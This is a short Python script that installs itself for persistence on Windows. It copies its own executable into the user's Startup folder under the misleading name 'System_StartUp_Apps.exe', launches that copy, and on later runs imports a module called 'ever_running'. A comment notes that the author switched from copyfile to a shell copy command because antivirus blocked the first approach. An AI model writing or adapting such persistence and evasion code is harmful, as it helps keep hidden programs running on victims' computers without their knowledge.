from os import path, system
from winshell import startup
from sys import argv
from shutil import copyfile

startup_path = startup()
local = path.dirname(argv[0])
file = argv[0]
dst = f"{startup_path}\System_StartUp_Apps.exe"

if local.lower() == startup_path.lower():
    import ever_running

else:
    exist = path.exists(f"{startup_path}\System_StartUp_Apps.exe")
    if exist == True:
        pass
    else:

        # copyfile(file, dst) # antivirus :(

        system(f"copy \"{file}\" \"{dst}\"")

        system(f"start \"\" \"{startup_path}\System_StartUp_Apps.exe\"")
